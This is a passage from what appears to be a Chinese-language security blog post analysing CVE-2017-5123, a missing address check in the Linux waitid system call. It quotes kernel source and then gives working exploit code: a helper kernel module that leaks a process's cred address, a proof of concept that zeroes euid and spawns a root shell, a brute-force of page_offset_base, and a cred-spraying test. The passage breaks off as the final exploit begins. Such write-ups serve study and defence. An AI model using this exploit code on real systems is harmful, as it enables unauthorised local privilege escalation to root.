class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * access_ok: - Checks if a user space pointer is valid</span></span><br><span class="line"><span class="comment"> * @type: Type of access: %VERIFY_READ or %VERIFY_WRITE.  Note that</span></span><br><span class="line"><span class="comment"> *        %VERIFY_WRITE is a superset of %VERIFY_READ - if it is safe</span></span><br><span class="line"><span class="comment"> *        to write to a block, it is always safe to read from it.</span></span><br><span class="line"><span class="comment"> * @addr: User space pointer to start of block to check</span></span><br><span class="line"><span class="comment"> * @size: Size of block to check</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Context: User context only. This function may sleep if pagefaults are</span></span><br><span class="line"><span class="comment"> *          enabled.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Checks if a pointer to a block of memory in user space is valid.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Returns true (nonzero) if the memory block may be valid, false (zero)</span></span><br><span class="line"><span class="comment"> * if it is definitely invalid.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that, depending on architecture, this function probably just</span></span><br><span class="line"><span class="comment"> * checks that the pointer is in the user space range - after calling</span></span><br><span class="line"><span class="comment"> * this function, memory access functions may still return -EFAULT.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> access_ok(type, addr, size)\</span></span><br><span class="line"><span class="meta">(&#123;\</span></span><br><span class="line"><span class="meta">WARN_ON_IN_IRQ();\</span></span><br><span class="line"><span class="meta">likely(!__range_not_ok(addr, size, user_addr_max()));\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br></pre></td></tr></table></figure><p>主要就是验证从 <code>addr</code> 到 <code>addr + size</code> 这段空间是否属于用户空间，因为使用频率较高所以定义成一个宏</p><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>waitid 系统调用的代码很短，位于源码目录 <code>kernel/exit.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">SYSCALL_DEFINE5(waitid, <span class="type">int</span>, which, <span class="type">pid_t</span>, upid, <span class="keyword">struct</span> siginfo __user *,</span><br><span class="line">infop, <span class="type">int</span>, options, <span class="keyword">struct</span> rusage __user *, ru)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">rusage</span> <span class="title">r</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">waitid_info</span> <span class="title">info</span> =</span> &#123;.status = <span class="number">0</span>&#125;;</span><br><span class="line"><span class="type">long</span> err = kernel_waitid(which, upid, &amp;info, options, ru ? &amp;r : <span class="literal">NULL</span>);</span><br><span class="line"><span class="type">int</span> signo = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (err &gt; <span class="number">0</span>) &#123;</span><br><span class="line">signo = SIGCHLD;</span><br><span class="line">err = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!err) &#123;</span><br><span class="line"><span class="keyword">if</span> (ru &amp;&amp; copy_to_user(ru, &amp;r, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> rusage)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (!infop)</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line"></span><br><span class="line">user_access_begin();</span><br><span class="line">unsafe_put_user(signo, &amp;infop-&gt;si_signo, Efault);</span><br><span class="line">unsafe_put_user(<span class="number">0</span>, &amp;infop-&gt;si_errno, Efault);</span><br><span class="line">unsafe_put_user((<span class="type">short</span>)info.cause, &amp;infop-&gt;si_code, Efault);</span><br><span class="line">unsafe_put_user(info.pid, &amp;infop-&gt;si_pid, Efault);</span><br><span class="line">unsafe_put_user(info.uid, &amp;infop-&gt;si_uid, Efault);</span><br><span class="line">unsafe_put_user(info.status, &amp;infop-&gt;si_status, Efault);</span><br><span class="line">user_access_end();</span><br><span class="line"><span class="keyword">return</span> err;</span><br><span class="line">Efault:</span><br><span class="line">user_access_end();</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以看到的是，在其使用 <code>unsafe_put_user()</code> 之前使用了 <code>user_access_begin()</code> 关闭 SMAP 保护，一系列赋值结束之后又使用 <code>user_access_end()</code> 关闭了 SMAP 保护，看起来一切都没有问题，但是在<strong>这一系列的操作之前并没有使用 access_ok 宏检测传入的地址的合法性</strong>，由此<strong>若是用户传入一个内核空间的地址，则可以非法向内核空间中写入数据</strong></p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02.漏洞利用"></a>0x02.漏洞利用</h1><p>观察 waitid 的源代码，我们发现在起始时将局部变量 signo 设为0，后面又调用了 <code>unsafe_put_user(signo, &amp;infop-&gt;si_signo, Efault)</code> ，若我们传入内核空间地址则可以通过这一语句向内核空间内写一个 <code>0</code></p><p>我们不难想到的是：<strong>若是我们能够将当前进程的 cred 结构体中的 euid 更改为 0，我们便能够获得 root 权限</strong></p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><p>我们通过如下内核模块向进程提供其 cred 结构体的 euid 成员在内核空间中的地址：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* arttnba3_module.ko</span></span><br><span class="line"><span class="comment">* developed by arttnba3</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/device.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_NAME <span class="string">&quot;a3device&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEVICE_PATH <span class="string">&quot;/dev/a3device&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CLASS_NAME <span class="string">&quot;a3module&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> major_num;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="keyword">class</span> * <span class="title">module_class</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">device</span> * <span class="title">module_device</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file</span> * __<span class="title">file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">inode</span> * __<span class="title">inode</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">a3_module_read</span><span class="params">(<span class="keyword">struct</span> file * __file, <span class="type">char</span> __user * user_buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> * __loff)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> <span class="title">a3_module_fo</span> =</span> </span><br><span class="line">&#123;</span><br><span class="line">.owner = THIS_MODULE,</span><br><span class="line">    .read = a3_module_read,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">kernel_module_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    major_num = register_chrdev(<span class="number">0</span>, DEVICE_NAME, &amp;a3_module_fo);</span><br><span class="line">    module_class = class_create(THIS_MODULE, CLASS_NAME);</span><br><span class="line">    module_device = device_create(module_class, <span class="literal">NULL</span>, MKDEV(major_num, <span class="number">0</span>), <span class="literal">NULL</span>, DEVICE_NAME);</span><br><span class="line">    __file = filp_open(DEVICE_PATH, O_RDONLY, <span class="number">0</span>);</span><br><span class="line">    __inode = file_inode(__file);</span><br><span class="line">    __inode-&gt;i_mode |= <span class="number">0666</span>;</span><br><span class="line">    filp_close(__file, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">kernel_module_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    device_destroy(module_class, MKDEV(major_num, <span class="number">0</span>));</span><br><span class="line">    class_destroy(module_class);</span><br><span class="line">    unregister_chrdev(major_num, DEVICE_NAME);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">a3_module_read</span><span class="params">(<span class="keyword">struct</span> file * __file, <span class="type">char</span> __user * user_buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> * __loff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">int</span> count;</span><br><span class="line">    *((<span class="type">long</span> <span class="type">long</span> *)buf) = (<span class="type">long</span> <span class="type">long</span> *) &amp;(current-&gt;real_cred-&gt;euid);</span><br><span class="line"></span><br><span class="line">    count = copy_to_user(user_buf, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(kernel_module_init);</span><br><span class="line">module_exit(kernel_module_exit);</span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;arttnba3&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试用 POC 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/a3device&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ptr[<span class="number">0x10</span>];</span><br><span class="line">    read(fd, ptr, <span class="number">8</span>);</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%p&quot;</span>, ptr[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        waitid(P_PID, pid, ptr[<span class="number">0</span>] - <span class="number">0x10</span>, WNOHANG );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getuid() == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;done!&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;failed!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，当我们运行 poc 后，其 euid 通过 waitid 的漏洞被更改为 0，之后我们便成功地获得了 root 权限</p><p><img src="https://i.loli.net/2021/08/03/Qarx62X5PptcO1m.png" alt="image.png"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>虽然我们能够通过 waitid 中的 <code>unsafe_put_user(0, &amp;infop-&gt;si_errno, Efault)</code> 这一语句向内核空间内写一个 <code>0</code>，<strong>但是我们并不能够直接获得当前进程的 cred 在内核空间中的地址，这也令这个漏洞难以被很好地利用</strong></p><p>那么若是需要完成提权，我们首先就需要找到当前进程的 cred 在内核空间中的地址</p><h3 id="Pre-线性映射区-（direct-mapping-area）"><a href="#Pre-线性映射区-（direct-mapping-area）" class="headerlink" title="Pre.线性映射区 （direct mapping area）"></a><em>Pre.线性映射区 （direct mapping area）</em></h3><p>众所周知，64 位下 Linux 的虚拟内存空间布局如下：</p><p><img src="https://i.loli.net/2021/11/09/k8NHa1ljMEfXQbh.png" alt="image.png"></p><p>其中有一块区域叫 <code>物理地址直接映射区</code>（direct mapping area），这块区域的线性地址到物理地址空间的映射是<strong>线性连续的</strong></p><p>在 32 位下这块区域叫<code>低端内存</code>，内核空间起始的 896 M 直接映射到物理内存的 0 ~ 896M</p><p><img src="https://i.loli.net/2021/11/23/q6jTAJkU9XuCHWV.png" alt="image.png"></p><p>64 位下好像没有低端内存这个概念了，但是 DMA 这个区域的概念还是存在的，<code>kmalloc</code> 便从此处分配内存，这块区域的起始位置称之为 <code>page_offset_base</code></p><blockquote><p>vmalloc 则从 vmalloc&#x2F;ioremap space 分配内存，起始地址为 <code>vmalloc_base</code>，这一块区域到物理地址间的映射是<strong>不连续的</strong></p></blockquote><h3 id="爆破-page-offset-base"><a href="#爆破-page-offset-base" class="headerlink" title="爆破 page_offset_base"></a>爆破 page_offset_base</h3><p>让我们重新将目光放回 waitid 这个系统调用的代码，我们知道 <code>unsafe_put_user</code> 类似于 <code>copy_from_user</code>，<strong>在访问非法地址时并不会引起 kernel panic，而是会返回一个错误值</strong>，由此我们便能够用来<strong>爆破 page_offset_base 的地址</strong>——包括 cred 在内的通过 kmalloc 分配的 object 都在线性存储区域内，而这个区域的起始地址便是 <code>page_offset_base</code> </p><p>我们可以输入任意地址到 waitid 中，若未命中则 waitid 将返回 <code>-EFAULT</code>，否则说明我们成功命中了<strong>有效地址</strong></p><p><code>page_offset_base</code> 在未开始 KASLR 时的基址为 <code>0xffff888000000000</code>，我们由此开始以 <code>0x10000000</code>作为尺度进行爆破</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;trying: %p\n&quot;</span>, page_offset_base);</span><br><span class="line">            retval = waitid(P_PID, pid, page_offset_base, WEXITED);</span><br><span class="line">            <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            page_offset_base += <span class="number">0x10000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful found the \033[0mpage_offset_base\033[32m\033[1m at:\033[0m%p\n&quot;</span>, page_offset_base);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>爆破需要的时间还是在可以承受的范围内的</p><p><img src="https://i.loli.net/2021/11/11/ObYBAvQEVK4RqSt.png" alt="image.png"></p><h3 id="预测-cred-所在位置"><a href="#预测-cred-所在位置" class="headerlink" title="预测 cred 所在位置"></a>预测 cred 所在位置</h3><p>还是使用之前的驱动，我们现在将尽可能多地在内核空间喷射 cred 结构体，并观察其位置：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> fd = open(<span class="string">&quot;/dev/a3device&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> ptr[<span class="number">0x10</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="type">size_t</span> page_offset_base = <span class="number">0xffff888000000000</span>;</span><br><span class="line">    <span class="type">int</span> retval;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (pid &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;trying: %p\n&quot;</span>, page_offset_base);</span><br><span class="line">            retval = waitid(P_PID, pid, page_offset_base, WEXITED);</span><br><span class="line">            <span class="keyword">if</span> (retval &gt;= <span class="number">0</span>)</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            page_offset_base += <span class="number">0x10000000</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Successful found the \033[0mpage_offset_base\033[32m\033[1m at:\033[0m%p\n&quot;</span>, page_offset_base);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            read(fd, ptr, <span class="number">8</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] cred: %p\n&quot;</span>, ptr[<span class="number">0</span>]);</span><br><span class="line">            sleep(<span class="number">100</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>观测结果如下：</p><p><img src="https://i.loli.net/2021/11/23/BQyXtzbn2DJVWMI.png" alt="image.png"></p><p>我们可以发现分配出来的 cred 都在 <code>page_offset_base + 0x10000000</code> 往后的位置，这为我们利用该漏洞改写 cred 结构体的 uid 提供了可能性</p><p>经笔者多次实验，从 <code>page_offset_base + 0x50000000</code> 开始往后的位置是出现 cred 结构体_可能性比较大的位置_</p><h3 id="喷射大量-cred，内核空间遍历写-0"><a href="#喷射大量-cred，内核空间遍历写-0" class="headerlink" title="喷射大量 cred，内核空间遍历写 0"></a>喷射大量 cred，内核空间遍历写 0</h3><p>那么我们现在有一个绝妙的思路——我们可以先在内核空间喷射足够多的 cred 结构体，随后利用 CVE-2017-5123 从 <code>page_offset_base + 0x50000000</code> 开始往后以 <code>0x10</code> 为尺度写 0，<strong>总能够在我们喷射的诸多 cred 中命中一个</strong><br>我们使用 clone 创建多个轻量级子进程，不断循环检测自身的 euid 是否被修改为 0</p><p>最终的 exp 如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span 